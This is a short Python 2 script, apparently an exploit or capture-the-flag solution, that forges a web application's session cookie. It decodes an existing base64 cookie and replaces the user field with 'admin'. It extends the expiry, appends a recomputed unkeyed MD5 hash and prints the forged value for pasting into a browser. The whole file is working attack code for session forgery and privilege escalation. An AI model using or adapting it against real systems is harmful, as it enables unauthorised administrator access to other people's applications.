import datetime
import hashlib
import requests
import sys

def main():
    old_cookie = sys.argv[1].decode('base64')
    print("Original cookie is: %s" % old_cookie)
    new_cookie_expiry = int((datetime.datetime.now() - datetime.datetime(1970,1,1)).total_seconds()) + 50000
    new_cookie = "admin,%s,%d,true" % (old_cookie.split(',')[1], new_cookie_expiry)
    new_cookie_md5 = hashlib.md5(new_cookie).hexdigest()
    new_cookie = new_cookie + ":%s" % new_cookie_md5
    print("New cookie is: %s" % new_cookie)
    print("Change your cookie in your browser to this :\n%s" % new_cookie.encode('base64'))

if __name__ == "__main__":
    main()
